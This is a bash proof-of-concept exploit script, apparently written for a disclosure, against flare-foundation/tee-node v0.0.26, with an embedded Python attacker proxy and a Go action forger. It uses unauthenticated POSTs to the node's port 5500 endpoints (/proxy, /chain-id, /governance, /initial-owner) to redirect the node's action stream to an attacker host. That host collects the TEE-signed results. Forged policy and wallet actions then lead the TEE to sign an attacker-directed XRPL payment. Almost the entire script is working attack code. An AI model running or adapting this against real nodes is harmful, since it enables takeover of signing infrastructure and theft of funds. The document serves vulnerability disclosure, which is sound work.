#!/usr/bin/env bash
# ============================================================================
# ONE-SHOT PoC — flare-foundation/tee-node v0.0.26
# Unauthenticated config-server takeover (0.0.0.0:5500, no auth, no set-once
# on /proxy) -> permanent proxy hijack -> TEE-signed result exfiltration ->
# governance/owner/chain-id capture -> signing-policy capture -> the TEE
# signs an attacker-directed XRPL payment and exfiltrates it to the attacker.
#
# Usage:   ./poc.sh [--quick] [--keep]
#          --quick : Phases 0-5 only (no Go toolchain needed)
#          --keep  : keep containers + workspace for inspection
# Env:     TEE_NODE_SRC=<path>  use a local clone instead of fetching v0.0.26
# Localnet only. Run solely against instances you own.
# ============================================================================
set -uo pipefail
cd "$(dirname "$0")"

TAG="v0.0.26"
REPO_URL="https://github.com/flare-foundation/tee-node.git"
NODE_IMAGE="ghcr.io/flare-foundation/tee-node:$TAG"
CHAIN_ID=31337          # set by the ATTACKER in Phase 4; must match the forger
GOVADDR="0x000000000000000000000000000000000000dEaD"

QUICK=0; KEEP=0
for a in "$@"; do case "$a" in --quick) QUICK=1;; --keep) KEEP=1;; esac; done

TS=$(date +%Y%m%d-%H%M%S)
WS=$(mktemp -d "${TMPDIR:-/tmp}/teepoc.XXXXXX")
EV="$PWD/poc-evidence-$TS"; mkdir -p "$EV/forger"
FAILED=0

C='\033[1;34m'; G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; N='\033[0m'
phase(){ echo -e "\n${C}════════ $1 ════════${N}"; }
ok(){   local l="[PASS] $1"; echo -e "${G}${l}${N}"; echo "$l" >> "$EV/SUMMARY.txt"; }
info(){ echo -e "${Y}[INFO]${N} $1"; }
fail(){ local l="[FAIL] $1"; echo -e "${R}${l}${N}"; echo "$l" >> "$EV/SUMMARY.txt"; FAILED=1; }

cleanup(){
  docker compose -f "$WS/docker-compose.yml" down -v >/dev/null 2>&1
  [ "$KEEP" = "1" ] && echo "KEEP=1 — workspace preserved: $WS" || rm -rf "$WS"
}
trap cleanup EXIT
echo "workspace: $WS"; echo "evidence:  $EV"

# ---------------------------------------------------------------- repo -----
if [ -n "${TEE_NODE_SRC:-}" ] && [ -d "${TEE_NODE_SRC:-}" ]; then
  cp -r "$TEE_NODE_SRC" "$WS/repo"
else
  git clone --depth 1 --branch "$TAG" "$REPO_URL" "$WS/repo" || { echo "clone failed"; exit 1; }
fi
{ echo "target: flare-foundation/tee-node"; echo "tag: $TAG"; \
  echo "commit: $(git -C "$WS/repo" rev-parse HEAD 2>/dev/null)"; } > "$EV/target-version.txt"

# ------------------------------------------------- embedded: proxies -------
mkdir -p "$WS/legit" "$WS/attacker"
cat > "$WS/legit/server.py" <<'EOF'
import json, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
stats = {"polls": 0, "results": 0}; lock = threading.Lock()
class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def _json(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        p, ts = self.path, time.strftime("%H:%M:%S")
        print(f"[legit-proxy {ts}] POST {p}", flush=True)
        if p.startswith("/queue/"):
            with lock: stats["polls"] += 1
            return self._json(200, {})          # idle queue: zero-ID action
        if p == "/result":
            with lock: stats["results"] += 1
            return self._json(200, {})
        return self._json(404, {})
    def do_GET(self):
        if self.path == "/stats":
            with lock: return self._json(200, stats)
        return self._json(404, {})
ThreadingHTTPServer(("0.0.0.0", 8080), H).serve_forever()
EOF

cat > "$WS/attacker/server.py" <<'EOF'
import json, re, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
MODE = {"m": "observe"}
PENDING = {"main": [], "direct": [], "backup": []}
POLLS, RECEIVED = [], []
lock = threading.Lock()
SIG_RE = re.compile(r"0x[0-9a-fA-F]{130}")
class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def _json(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        p, ts = self.path, time.strftime("%H:%M:%S")
        if p == "/mode":
            MODE["m"] = json.loads(body)["mode"]
            print(f"[attacker {ts}] mode -> {MODE['m']}", flush=True)
            return self._json(200, {"mode": MODE["m"]})
        if p == "/actions":
            req = json.loads(body); q = req.get("queue", "direct")
            with lock: PENDING.setdefault(q, []).append(req["action"])
            print(f"[attacker {ts}] queued forged action -> /queue/{q}", flush=True)
            return self._json(200, {})
        if p.startswith("/queue/"):
            q = p.rsplit("/", 1)[-1]
            with lock: POLLS.append(p)
            print(f"[attacker {ts}] HIJACKED POLL {p}", flush=True)
            if MODE["m"] == "force-errors":
                return self._json(404, {"error": "not found"})
            with lock: pend = PENDING.get(q, [])
            if pend:
                a = pend.pop(0)
                print(f"[attacker {ts}] >>> SERVING FORGED ACTION on {p}", flush=True)
                return self._json(200, a)
            return self._json(200, {})
        if p == "/result":
            with lock: RECEIVED.append(body.decode(errors="replace"))
            print(f"[attacker {ts}] *** TEE RESULT CAPTURED: {body[:180]}", flush=True)
            return self._json(200, {})
        return self._json(404, {})
    def do_GET(self):
        if self.path == "/stats":
            with lock:
                signed = sum(1 for r in RECEIVED if SIG_RE.search(r))
                return self._json(200, {"polls": len(POLLS), "results": len(RECEIVED),
                                        "signed_results": signed})
        if self.path == "/received":
            with lock: return self._json(200, RECEIVED)
        return self._json(404, {})
ThreadingHTTPServer(("0.0.0.0", 9000), H).serve_forever()
EOF

cat > "$WS/legit/Dockerfile"  <<'EOF'
FROM python:3.12-slim
COPY server.py /srv/server.py
CMD ["python3", "/srv/server.py"]
EOF
cat > "$WS/attacker/Dockerfile" <<'EOF'
FROM python:3.12-slim
RUN apt-get update && apt-get install -y --no-install-recommends curl jq \
 && rm -rf /var/lib/apt/lists/*
COPY server.py /srv/server.py
CMD ["python3", "/srv/server.py"]
EOF

# ------------------------------------------------- embedded: forger -------
# Injected INTO the clone (Go forbids external modules from importing
# internal/). Every action is built by the project's own testutils factory —
# the same code path as TestProcessorsEndToEnd.
mkdir -p "$WS/repo/pocforger"
cat > "$WS/repo/pocforger/forger_test.go" <<'EOF'
package pocforger

import (
    "crypto/ecdsa"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "math/big"
    "os"
    "path/filepath"
    "strings"
    "testing"
    "time"

    "github.com/ethereum/go-ethereum/accounts/abi"
    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/crypto"
    csigning "github.com/flare-foundation/go-flare-common/pkg/signing"
    "github.com/flare-foundation/go-flare-common/pkg/tee/op"
    "github.com/flare-foundation/go-flare-common/pkg/tee/structs/payments"
    "github.com/flare-foundation/go-flare-common/pkg/tee/structs/wallet"
    "github.com/flare-foundation/go-flare-common/pkg/xrpl/signing"
    "github.com/flare-foundation/go-flare-common/pkg/xrpl/signing/signer"
    "github.com/flare-foundation/tee-node/internal/testutils"
    "github.com/flare-foundation/tee-node/pkg/types"
    wallets "github.com/flare-foundation/tee-node/pkg/wallets"
    "github.com/flare-foundation/tee-node/pkg/utils"
    "github.com/stretchr/testify/require"
)

const (
    pocChainID = uint64(31337) // must equal the chain-id set by the attack (Phase 4)
    pocEpoch   = uint32(2)
    numVoters  = 5
    numAdmins  = 3
    numCosigns = 3
)

var (
    walletID = common.HexToHash("0xabcdef")
    keyID    = uint64(1)
)

// keys loads attacker key material, generating + persisting on first use.
func keys(t *testing.T, dir, prefix string, n int) []*ecdsa.PrivateKey {
    t.Helper()
    out := make([]*ecdsa.PrivateKey, n)
    for i := range out {
        p := filepath.Join(dir, fmt.Sprintf("%s_%d.hex", prefix, i))
        if b, err := os.ReadFile(p); err == nil {
            bn, err := hex.DecodeString(strings.TrimSpace(string(b)))
            require.NoError(t, err)
            k, err := crypto.ToECDSA(bn)
            require.NoError(t, err)
            out[i] = k
            continue
        }
        k, err := crypto.GenerateKey()
        require.NoError(t, err)
        require.NoError(t, os.MkdirAll(dir, 0o755))
        require.NoError(t, os.WriteFile(p, []byte(hex.EncodeToString(crypto.FromECDSA(k))), 0o600))
        out[i] = k
    }
    return out
}

func emit(t *testing.T, queue string, action any, out string) {
    t.Helper()
    b, err := json.Marshal(map[string]any{"queue": queue, "action": action})
    require.NoError(t, err)
    require.NoError(t, os.WriteFile(out, b, 0o644))
}

func actionResultSignHash(t *testing.T, ar types.ActionResult) []byte {
    t.Helper()
    h, err := csigning.NewPayload(csigning.TEEActionResult, pocChainID, common.BytesToHash(ar.Hash())).Hash()
    require.NoError(t, err)
    return h[:]
}

func TestPocForger(t *testing.T) {
    cmd := os.Getenv("POC_FORGER_CMD")
    out := os.Getenv("POC_FORGER_OUT")
    keysDir := os.Getenv("POC_FORGER_KEYS")
    capture := os.Getenv("POC_FORGER_CAPTURE")
    teeIDHex := os.Getenv("POC_FORGER_TEEID")
    require.NotEmpty(t, cmd, "POC_FORGER_CMD required")

    teeID := common.Address{}
    if teeIDHex != "" {
        teeID = common.HexToAddress(teeIDHex)
    }

    switch cmd {
    case "tee-info": // D1: attestation oracle -> node identity
        req := &types.TeeInfoRequest{Challenge: common.HexToHash("0x" + strings.Repeat("ab", 32))}
        emit(t, "direct", testutils.BuildMockDirectAction(t, op.Get, op.TEEInfo, req), out)

    case "key-info": // optional: wallet inventory oracle
        emit(t, "direct", testutils.BuildMockDirectAction(t, op.Get, op.KeyInfo, []any{}), out)

    case "init-policy": // D2: capture the instruction-verification root of trust
        voters := keys(t, keysDir, "voter", numVoters)
        addrs := make([]common.Address, len(voters))
        pubKeys := make([]types.PublicKey, len(voters))
        for i, k := range voters {
            addrs[i] = crypto.PubkeyToAddress(k.PublicKey)
            pubKeys[i] = types.PubKeyToStruct(&k.PublicKey)
        }
        policy := testutils.GenerateRandomPolicyData(t, pocEpoch, addrs, int64(918273))
        req := &types.InitializePolicyRequest{InitialPolicyBytes: policy.RawBytes(), PublicKeys: pubKeys}
        emit(t, "direct", testutils.BuildMockDirectAction(t, op.Policy, op.InitializePolicy, req), out)

    case "key-generate": // D3: TEE mints a wallet under the captured policy
        require.NotEmpty(t, teeIDHex, "POC_FORGER_TEEID required")
        voters := keys(t, keysDir, "voter", numVoters)
        admins := keys(t, keysDir, "admin", numAdmins)
        cos := keys(t, keysDir, "cosigner", numCosigns)

        adminPubs := make([]wallet.PublicKey, len(admins))
        for i, k := range admins {
            pk := types.PubKeyToStruct(&k.PublicKey)
            adminPubs[i] = wallet.PublicKey{X: pk.X, Y: pk.Y}
        }
        cosAddrs := make([]common.Address, len(cos))
        for i, k := range cos {
            cosAddrs[i] = crypto.PubkeyToAddress(k.PublicKey)
        }

        msg := wallet.IWalletKeyManagerKeyGenerate{
            TeeId: teeID, WalletId: walletID, KeyId: keyID,
            KeyType: wallets.XRPType, SigningAlgo: wallets.XRPSignAlgo,
            ConfigConstants: wallet.IWalletKeyManagerKeyConfigConstants{
                AdminsPublicKeys: adminPubs, AdminsThreshold: uint64(len(adminPubs)),
                Cosigners: cosAddrs, CosignersThreshold: uint64(len(cosAddrs)),
            },
        }
        enc, err := abi.Arguments{wallet.MessageArguments[op.KeyGenerate]}.Pack(msg)
        require.NoError(t, err)
        action := testutils.BuildMockInstructionAction(t, op.Wallet, op.KeyGenerate, enc,
            voters, pocChainID, teeID, pocEpoch, nil, nil, nil, 0,
            types.Threshold, uint64(time.Now().Unix()))
        emit(t, "main", action, out)

    case "xrp-pay": // D4: terminal impact — TEE signs an attacker-directed payment
        require.NotEmpty(t, teeIDHex, "POC_FORGER_TEEID required")
        voters := keys(t, keysDir, "voter", numVoters)
        cos := keys(t, keysDir, "cosigner", numCosigns)
        cosAddrs := make([]common.Address, len(cos))
        for i, k := range cos {
            cosAddrs[i] = crypto.PubkeyToAddress(k.PublicKey)
        }
        signingKeys := append(append([]*ecdsa.PrivateKey{}, voters...), cos...)

        msg := payments.ITeePaymentsPaymentInstructionMessage{
            WalletId:         walletID,
            TeeIdKeyIdPairs:  []payments.TeeIdKeyIdPair{{TeeId: teeID, KeyId: keyID}},
            SenderAddress:    "ravbaTwRkNqecy9Zdw8zwrw4uK5awjqhFd",    // test fixture
            RecipientAddress: "rrrrrrrrrrrrrrrrrNAMEtxvNvQ",           // attacker-chosen in a real attack
            Amount:           big.NewInt(1000000000),
            MaxFee:           big.NewInt(10),
            FeeSchedule:      []byte{0x27, 0x10, 0x00, 0x01}, // 100% fee, 1s delay
            PaymentReference: [32]byte{},
            Nonce:            0,
        }
        enc, err := abi.Arguments{payments.MessageArguments[op.Pay]}.Pack(msg)
        require.NoError(t, err)
        action := testutils.BuildMockInstructionAction(t, op.XRP, op.Pay, enc,
            signingKeys, pocChainID, teeID, pocEpoch, []byte{}, nil,
            cosAddrs, uint64(len(cosAddrs)), types.Threshold, uint64(time.Now().Unix()))
        emit(t, "main", action, out)

    case "extract-tee-id": // reads captured TEEInfo ActionResponse, verifies its TEE signature
        b, err := os.ReadFile(capture)
        require.NoError(t, err)
        var resp types.ActionResponse
        require.NoError(t, json.Unmarshal(b, &resp))
        var tir types.TeeInfoResponse
        require.NoError(t, json.Unmarshal(resp.Result.Data, &tir))
        pub, err := types.ParsePubKey(tir.TeeInfo.PublicKey)
        require.NoError(t, err)
        id := crypto.PubkeyToAddress(*pub)
        require.NoError(t, utils.VerifySignature(actionResultSignHash(t, resp.Result), resp.Signature, id),
            "TEEInfo response not genuinely signed by the node key")
        require.NoError(t, os.WriteFile(out, []byte(id.Hex()), 0o644))

    case "verify-xrp": // cryptographic proof of the terminal impact
        b, err := os.ReadFile(capture)
        require.NoError(t, err)
        var resp types.ActionResponse
        require.NoError(t, json.Unmarshal(b, &resp))
        require.Equal(t, uint8(1), resp.Result.Status, "expected the final signed response")
        require.NoError(t, utils.VerifySignature(actionResultSignHash(t, resp.Result), resp.Signature,
            common.HexToAddress(teeIDHex)), "ActionResponse signature by TEE key INVALID")
        var txs types.XRPSignResponse
        require.NoError(t, json.Unmarshal(resp.Result.Data, &txs))
        require.NotEmpty(t, txs, "no signed transactions in result")
        for i, tx := range txs {
            signersAny, ok := tx["Signers"].([]any)
            require.True(t, ok, "tx[%d] missing Signers", i)
            require.NotEmpty(t, signersAny, "tx[%d] has no signers", i)
            for j, sAny := range signersAny {
                s, err := signer.Parse(sAny.(map[string]any))
                require.NoError(t, err, "tx[%d] signer[%d] parse", i, j)
                valid, err := signing.ValidateMultiSig(tx, s)
                require.NoError(t, err, "tx[%d] signer[%d]", i, j)
                require.True(t, valid, "tx[%d] signer[%d] XRPL multisig INVALID", i, j)
            }
        }
        t.Logf("VERIFIED: TEE-signed result carrying %d validly multi-signed XRPL transaction(s)", len(txs))

    case "governance-hash": // expected GovernanceHash for the Phase-5 captured signer set
        h, err := types.GovernanceHash([]common.Address{common.HexToAddress(os.Getenv("POC_FORGER_GOVADDR"))}, 1)
        require.NoError(t, err)
        require.NoError(t, os.WriteFile(out, []byte(h.Hex()), 0o644))
    }
}
EOF

# ------------------------------------------------- compose -----------------
# Prefer the PUBLISHED image (evidence: the shipped artifact is vulnerable);
# fall back to a source build with the reproducibility build-arg.
NODE_BLOCK=""
if docker pull "$NODE_IMAGE" 2>/dev/null; then
  info "using published image $NODE_IMAGE"
  NODE_BLOCK="    image: $NODE_IMAGE"
else
  info "published image unavailable — building from source at $TAG"
  SDE=$(git -C "$WS/repo" log -1 --format=%ct)
  NODE_BLOCK="    build:
      context: ./repo
      args:
        SOURCE_DATE_EPOCH: $SDE"
fi

cat > "$WS/docker-compose.yml" <<EOF
name: tee-node-poc
services:
  tee-node:
 $NODE_BLOCK
    environment:
      MODE: "1"
      LOG_LEVEL: "INFO"
      PROXY_URL: http://legit-proxy:8080
    networks: [pocnet]
  legit-proxy:
    build: ./legit
    networks: [pocnet]
  attacker:
    build: ./attacker
    networks: [pocnet]
networks:
  pocnet:
    driver: bridge
EOF

dc(){ docker compose -f "$WS/docker-compose.yml" "$@"; }
nc(){ dc exec -T attacker curl -sS --max-time 5 "$@"; }
jqf(){ dc exec -T attacker jq -r "$@"; }

# ============================================================ PHASE 0 ======
phase "PHASE 0 — Build & start | NORMAL FLOW (BEFORE)"
dc up -d --build
echo "waiting for the node to poll its deploy-time-configured proxy..."
POLLS=0
for i in $(seq 1 120); do
  POLLS=$(nc http://legit-proxy:8080/stats | jqf .polls 2>/dev/null) || POLLS=0
  [ "${POLLS:-0}" -gt 5 ] && break
  sleep 1
done
[ "${POLLS:-0}" -gt 5 ] && ok "Normal flow: node polling legitimate proxy (${POLLS}x)" \
                       || fail "node never polled the legit proxy"
A0=$(nc http://attacker:9000/stats | jqf .polls 2>/dev/null) || A0=0
[ "${A0:-0}" -eq 0 ] && ok "Attacker blind before the attack (0 polls)" || fail "pre-attack visibility"
nc http://legit-proxy:8080/stats > "$EV/stats-before.json"

# ============================================================ PHASE 1 ======
phase "PHASE 1 — Attack surface (reconnaissance)"
CODE=$(nc -o /dev/null -w '%{http_code}' http://tee-node:5500/ 2>/dev/null)
[ "${CODE:-000}" != "000" ] \
  && ok ":5500 reachable CROSS-CONTAINER (all-interfaces bind; SignHost-style loopback binding would refuse)" \
  || fail ":5500 unreachable"
CODE8=$(nc -o /dev/null -w '%{http_code}' http://tee-node:8888/ 2>/dev/null)
[ "${CODE8:-000}" = "000" ] \
  && info ":8888 refuses external peers (sign API is loopback-fixed by design — the contrast :5500 violates)" \
  || info ":8888 answered ($CODE8)"

# ============================================================ PHASE 2 ======
phase "PHASE 2 — THE ATTACK: one unauthenticated request"
{
  echo '$ POST http://tee-node:5500/proxy  {"url":"http://attacker:9000"}'
  echo "(no auth headers of any kind; PROXY_URL was provisioned at deploy time via env)"
  docker compose -f "$WS/docker-compose.yml" exec -T attacker \
    curl -sS -i --max-time 5 -X POST http://tee-node:5500/proxy \
    -H 'Content-Type: application/json' -d '{"url":"http://attacker:9000"}'
} | tee "$EV/01-attack-request.txt"
grep -q "200" "$EV/01-attack-request.txt" \
  && ok "Trust anchor re-pointed with a single unauthenticated POST" \
  || fail "attack request rejected"

# ============================================================ PHASE 3 ======
phase "PHASE 3 — AFTERMATH: suppression + hijack"
P1=$(nc http://legit-proxy:8080/stats | jqf .polls); sleep 8
P2=$(nc http://legit-proxy:8080/stats | jqf .polls)
[ "$P1" = "$P2" ] && ok "Legit proxy FROZEN at $P1 (silent total suppression)" \
                 || fail "legit proxy still polled ($P1 -> $P2)"
AP=$(nc http://attacker:9000/stats | jqf .polls)
[ "${AP:-0}" -ge 6 ] && ok "Attacker now owns the node's action stream (${AP} polls)" || fail "no hijack"
dc logs tee-node 2>/dev/null | grep -m3 "attacker:9000" \
  && ok "Node's own logs confirm the poisoned proxy URL" || true

# ============================================================ PHASE 4 ======
phase "PHASE 4 — Chain-ID capture + TEE-SIGNED exfiltration"
nc -X POST http://attacker:9000/mode -H 'Content-Type: application/json' -d '{"mode":"force-errors"}' >/dev/null
sleep 3
S0=$(nc http://attacker:9000/stats | jqf .signed_results)
info "signed results before chain-id: ${S0:-0} (action-result signing binds CHAIN_ID and fails closed — expected)"
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST http://tee-node:5500/chain-id \
  -H 'Content-Type: application/json' -d "{\"chainId\":$CHAIN_ID}")
[ "$CODE" = "200" ] && ok "CHAIN_ID captured by attacker over unauthenticated endpoint (HTTP $CODE)" \
                    || fail "chain-id capture failed ($CODE)"
sleep 8
SG=$(nc http://attacker:9000/stats | jqf .signed_results)
[ "${SG:-0}" -ge 3 ] && ok "TEE-SIGNED results exfiltrated to attacker: ${SG} (ECDSA by the node key)" \
                     || fail "no signed results (${SG:-0})"
nc http://attacker:9000/received | jqf '.[-1].body' > "$EV/02-sample-signed-result.json"
head -c 300 "$EV/02-sample-signed-result.json"; echo

# ============================================================ PHASE 5 ======
phase "PHASE 5 — Persistence & the set-once asymmetry"
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST http://tee-node:5500/proxy \
  -H 'Content-Type: application/json' -d '{"url":"http://attacker:9000"}')
[ "$CODE" = "200" ] && ok "/proxy re-set AGAIN ($CODE): NO set-once — deploy-time env does not protect it (falsifies security.md's mitigation claim)" \
                    || fail "unexpected ($CODE)"
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST http://tee-node:5500/governance \
  -H 'Content-Type: application/json' -d "{\"signers\":[\"$GOVADDR\"],\"threshold\":1}")
[ "$CODE" = "200" ] && ok "GOVERNANCE captured (machine-path authorization root -> attacker)" || fail "governance ($CODE)"
CODE2=$(nc -o /dev/null -w '%{http_code}' -X POST http://tee-node:5500/governance \
  -H 'Content-Type: application/json' -d "{\"signers\":[\"$GOVADDR\"],\"threshold\":1}")
[ "$CODE2" = "403" ] && ok "Contrast: /governance IS set-once (2nd call -> 403); /proxy alone is endlessly mutable" \
                    || info "2nd governance call: $CODE2"
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST http://tee-node:5500/initial-owner \
  -H 'Content-Type: application/json' -d "{\"owner\":\"$GOVADDR\"}")
[ "$CODE" = "200" ] && ok "INITIAL OWNER captured (flows into attested MachineData)" || fail "owner ($CODE)"
nc -X POST http://attacker:9000/mode -H 'Content-Type: application/json' -d '{"mode":"observe"}' >/dev/null

# ============================================================ PHASE 6 ======
phase "PHASE 6 — Deep impact: policy capture -> TEE signs attacker-directed XRPL payment"
if [ "$QUICK" = "1" ]; then
  info "skipped (--quick)"
elif docker run --rm -v "$WS:/ws" -v "$WS/repo:/repo" -v poc-gomodcache:/go/pkg/mod \
       -v poc-gocache:/root/.cache/go-build -w /repo -e GOFLAGS=-mod=mod \
       golang:1.25 go test -c ./pocforger/ -o /ws/forger.test 2>"$EV/forger-build.log"; then
  info "forger built from the project's own testutils action factory"

  forge(){
    docker run --rm -v "$WS:/ws" \
      -e POC_FORGER_CMD="$1" -e POC_FORGER_OUT=/ws/out.json -e POC_FORGER_KEYS=/ws/keys \
      -e POC_FORGER_TEEID="${TEEID:-}" -e POC_FORGER_CAPTURE="${CAPTURE:-}" \
      -e POC_FORGER_GOVADDR="$GOVADDR" \
      golang:1.25 /ws/forger.test -test.run TestPocForger -test.count=1 -test.v
  }
  push_action(){ nc -X POST http://attacker:9000/actions -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null; }
  wait_new(){ local prev=$1 to=${2:-20} i c
    for i in $(seq 1 $((to*2))); do
      c=$(nc http://attacker:9000/stats | jqf .results 2>/dev/null) || c=0
      [ "${c:-0}" -gt "$prev" ] && { echo "$c"; return 0; }
      sleep 0.5
    done; echo "$prev"; return 1; }
  body_at(){ nc http://attacker:9000/received | jqf ".[$1]"; }

  # --- D1: TEEInfo oracle -> node identity (+ governance commitment proof)
  R0=$(nc http://attacker:9000/stats | jqf .results)
  forge tee-info >/dev/null && push_action
  R1=$(wait_new "$R0") || { fail "no result for TEEInfo"; }
  CAPTURE="$WS/captured.json"; body_at "$R0" > "$CAPTURE"
  cp "$CAPTURE" "$EV/forger/01-teeinfo-response.json"
  forge extract-tee-id >/dev/null && TEEID=$(cat "$WS/out.json") || TEEID=""
  [ -n "$TEEID" ] && ok "Node identity via zero-auth direct action: $TEEID (TEE signature on the response verified)" \
                  || fail "tee-id extraction failed"
  forge governance-hash >/dev/null && GH=$(cat "$WS/out.json")
  grep -qi "${GH#0x}" "$CAPTURE" \
    && ok "Captured governance is committed into the node's attested info (GovernanceHash match)" \
    || info "GovernanceHash grep miss — inspect 01-teeinfo-response.json"

  # --- D2: signing-policy capture (instruction-verification root of trust)
  R1=$(nc http://attacker:9000/stats | jqf .results)
  forge init-policy >/dev/null && push_action
  R2=$(wait_new "$R1") || fail "no result for InitializePolicy"
  body_at "$R1" > "$EV/forger/02-policy-capture-response.json"
  info "policy result captured (authoritative proof arrives transitively in D4)"

  # --- D3: TEE mints a wallet under the attacker-controlled policy
  R2=$(nc http://attacker:9000/stats | jqf .results)
  forge key-generate >/dev/null && push_action
  R3=$(wait_new "$R2") || fail "no result for KeyGenerate"
  body_at "$R2" > "$EV/forger/03-keygenerate-response.json"
  grep -qi "Signers\|PublicKey" "$EV/forger/03-keygenerate-response.json" \
    && ok "TEE MINTED A WALLET under the captured policy (key existence proof returned)" \
    || info "inspect 03-keygenerate-response.json"

  # --- D4: terminal impact — TEE signs an attacker-directed XRPL payment
  R3=$(nc http://attacker:9000/stats | jqf .results)
  forge xrp-pay >/dev/null && push_action
  NEW=$(wait_new "$R3" 15) || NEW=$R3
  sleep 6   # fee-schedule goroutine posts the final result after its delay
  NEW=$(nc http://attacker:9000/stats | jqf .results)
  FOUND=""
  for i in $(seq "$R3" $((NEW-1))); do
    b=$(body_at "$i")
    if echo "$b" | grep -q "Signers"; then echo "$b" > "$WS/xrp-captured.json"; FOUND=1; break; fi
  done
  if [ -n "$FOUND" ] && CAPTURE="$WS/xrp-captured.json" forge verify-xrp | tee "$EV/forger/04-verification.txt"; then
    cp "$WS/xrp-captured.json" "$EV/forger/04-xrppay-signed-transactions.json"
    ok "TERMINAL IMPACT VERIFIED: TEE-signed result containing VALIDLY MULTI-SIGNED XRPL payment transaction(s), exfiltrated to the attacker — the node executed a payment authored entirely by the attacker"
  else
    fail "XRP payment verification failed (see $EV/forger/)"
  fi
else
  info "forger build failed (see $EV/forger-build.log) — Phases 0-5 above remain fully valid; D1-D4 skipped"
fi

# ============================================================ SUMMARY ======
phase "SUMMARY"
nc http://legit-proxy:8080/stats > "$EV/stats-after.json"
nc http://attacker:9000/stats     > "$EV/stats-attacker.json"
nc http://attacker:9000/received  > "$EV/05-all-captured-results.json"
dc logs tee-node     > "$EV/node.log" 2>&1
dc logs legit-proxy  > "$EV/legit-proxy.log" 2>&1
dc logs attacker     > "$EV/attacker.log" 2>&1
LEG=$(jqf .polls < "$EV/stats-after.json" 2>/dev/null || cat "$EV/stats-after.json" | jqf .polls)
ATT=$(nc http://attacker:9000/stats | jqf .polls)
SGN=$(nc http://attacker:9000/stats | jqf .signed_results)
cat >> "$EV/SUMMARY.txt" <<EOF

target:      flare-foundation/tee-node $TAG  ($(git -C "$WS/repo" rev-parse --short HEAD 2>/dev/null))
attack cost: ONE unauthenticated HTTP POST from an unprivileged network peer
detection:   NONE at node level (proxyHandler logs nothing; proxy URL absent from Node.Info()/attestation)

metric                              BEFORE            AFTER
----------------------------------  ----------------  ----------------
node -> legit proxy polls           ${POLLS} (rising)   ${LEG} (frozen)
node -> attacker polls              0                 ${ATT}
TEE-signed results to attacker      0                 ${SGN}
proxy URL (trust anchor)            legit-proxy:8080  attacker:9000
governance / initial owner          (unset)           attacker
signing policy                      (uninitialized)   attacker (Phase 6)
XRPL payment signed by TEE          -                 YES, verified (Phase 6)
EOF
cat "$EV/SUMMARY.txt"
( cd "$EV" && sha256sum SUMMARY.txt *.json forger/*.json forger/*.txt 2>/dev/null > SHA256SUMS )
[ "$FAILED" = "0" ] && echo -e "\n${G}RESULT: ALL ASSERTIONS PASSED — evidence: $EV${N}" \
                    || echo -e "\n${R}RESULT: SOME ASSERTIONS FAILED — inspect $EV${N}"
exit "$FAILED"
